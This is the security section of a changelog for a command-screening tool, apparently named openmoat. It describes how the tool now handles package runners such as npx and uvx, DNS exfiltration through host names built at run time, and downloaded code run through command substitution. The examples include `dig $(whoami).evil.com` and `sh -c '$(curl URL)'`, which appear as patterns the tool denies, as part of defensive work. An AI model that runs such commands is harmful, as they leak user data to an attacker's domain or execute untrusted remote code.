### Security
- `npx`, `bunx`, `pnpx`, `npm exec`, `npm x`, `pnpm dlx`, `yarn dlx`, `bun x`, `uvx`, `uv tool run` and `pipx run` are read for the package they fetch and run: a name that is a near miss of a popular package needs review as its install does (`package-near-miss`), and a name on neither the bundled popular list nor the new tool lists (scaffolders, linters, type checkers and other tools people commonly run this way) needs review too, pinned to a version or not (`package-run-unknown`, new in the default policy). It does not when the project already provides it: a program in the project's `node_modules/.bin` (`npx tsc`, `npx ng`), or a package its nearest `package.json`, `pyproject.toml` or `uv.lock` declares; a declared near miss still needs review. `npx --no-install`, `npm exec --no` and `uvx --offline` fetch nothing and are unchanged. `openmoat allow --always` approves the package with the command (ADR-102).
- A host name a resolver or client gets that the shell builds at run time from a command's output (`dig $(whoami).evil.com`, ``nslookup `id`.evil.com``) or, for a program that is not an HTTP client, a variable (`host -t txt $C.evil.com`) is decided as the domain it ends in, which the default policy denies when unlisted; a plain variable in an HTTP client's URL (`curl https://$BUCKET.s3.amazonaws.com/x`) is unchanged and defers as the URL written out does. `drill`, `kdig`, `delv`, `getent` and `resolvectl` name hosts as `dig` does, so their lookups of unlisted names, internal ones included, are denied. DNS exfiltration through a built name no longer defers; what is still not seen is in `docs/LIMITS.md` (ADR-102).
- Downloaded code run through a command substitution in the program's place (`$(curl URL)`, also inside a shell's single-quoted string such as `sh -c '$(curl URL)'`), in an interpreter's inline code (`python3 -c "$(curl URL)"`), or in the command `find -exec` or `xargs` runs is denied as `curl URL | sh` is (`pipe-to-shell`); before, these deferred (ADR-102).
